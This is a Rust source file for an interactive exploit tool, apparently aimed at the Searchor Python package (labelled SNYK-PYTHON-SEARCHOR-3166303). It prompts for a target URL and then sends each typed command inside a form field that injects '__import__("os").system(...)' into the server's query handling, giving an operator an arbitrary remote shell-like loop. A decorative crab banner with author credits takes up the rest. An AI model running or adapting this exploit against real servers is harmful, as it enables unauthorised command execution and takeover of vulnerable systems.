#![allow(non_snake_case)]
use reqwest::Client;
use std::error::Error;
use std::io::{self, Write};
use colored::*;

#[tokio::main]
async fn main() {
    display_welcome_message();

    print!("Enter the target URL: ");
    io::stdout().flush().unwrap();
    let mut url_input = String::new();
    io::stdin().read_line(&mut url_input).unwrap();
    let url = url_input.trim();

    loop {
        print!("Enter command: ");
        io::stdout().flush().unwrap();
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();
        let command = input.trim();

        if command.to_lowercase() == "exit" {
            println!("Exiting...");
            break;
        }

        if let Err(e) = send_post_request(url, command).await {
            eprintln!("Error: {}", e);
        }
    }
}

async fn send_post_request(url: &str, command: &str) -> Result<(), Box<dyn Error>> {
    let client = Client::new();

    let payload = format!("engine=Walmart&query=aaa', __import__(\"os\").system(\"{}\"),'", command);

    let res = client.post(url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(payload.to_string())
        .send()
        .await?;

    let status = res.status();
    let headers = res.headers().clone();
    let response_text = res.text().await?;

    println!("Status: {}", status);
    println!("Headers: {:#?}", headers);
    println!("{}", response_text);
    
    Ok(())
}

fn display_welcome_message() {
    let crab_width = 74;
    let separator = "++=============================================++";
    let title = "||     SNYK-PYTHON-SEARCHOR-3166303 Exploit     ||";
    let author = "||          By SourMilk & Ali3nW3rX             ||";
    let tagline = "||  Exploiting with Ferris: Rust's Cyber Claw   ||";
    let crab = r#"
                                                                                
                                  ((.  /((   ((,                                
                            .((( (((((((((((((((.*(((                           
                        (((*((((((((((((((((((((((((((((((                      
      ,             .   ((((((((((((((((((((((((((((((((((   *         (((    , 
  ,(   (((/        ,((((((((((((((((((((((((((((((((((((((((((       ((((#   (( 
 /(((  (((((    ((((((((((((((((((((((((((((((((((((((((((((((((((  (((((# /((( 
 ,((((( ((((    (((((((((((((((((((((((((((((((((((((((((((((((((   ,(((((((((  
   ,(((((((* ,((((((((((((((((((((((((((((((((((((((((((((((((((((((  ((((((    
       (((*   ((((((((((((((((((((  #@@((((((%  @@#((((((((((((((((( (((*       
         ((((((((((((((((((((((((@  @@@@((((#@  @@@(((((((((((((((((((,         
           *(((((((((((((((((((((#@@@@@&(((((@@@@@@((((((((((((((((((((         
         .((((//%%%#(((((((((((((((((((((((((((((((((((((((((#%%*%%,((((,       
           ((((. (%    /%%%%#((((((((((((&@&(((((((((##%%%#.    %# .(((         
             .(((  (#                 .,,**,,.                 %   ((           
                ((.  (                                        ,  ,(,            
                  .(                                             /              
                                                                                 "#;

    let padding = (crab_width - separator.len()) / 2;
    let padding_str = " ".repeat(padding);

    let centered_separator = format!("{}{}", padding_str, separator).bold().blue();
    let centered_title = format!("{}{}", padding_str, title).bold().red();
    let centered_author = format!("{}{}", padding_str, author).bold().purple();
    let centered_tagline = format!("{}{}", padding_str, tagline).bold().green();

    println!("{}", centered_separator);
    println!("{}", format!("{}{}{}{}", padding_str, "|".bold().blue(), "                                               ", "|".bold().blue()));
    println!("{}", centered_title);
    println!("{}", format!("{}{}{}{}", padding_str, "|".bold().blue(), "                                               ", "|".bold().blue()));
    println!("{}", centered_author);
    println!("{}", format!("{}{}{}{}", padding_str, "|".bold().blue(), "                                               ", "|".bold().blue()));
    println!("{}", centered_tagline);
    println!("{}", format!("{}{}{}{}", padding_str, "|".bold().blue(), "                                               ", "|".bold().blue()));
    println!("{}", centered_separator);
    println!("{}", crab.red());
}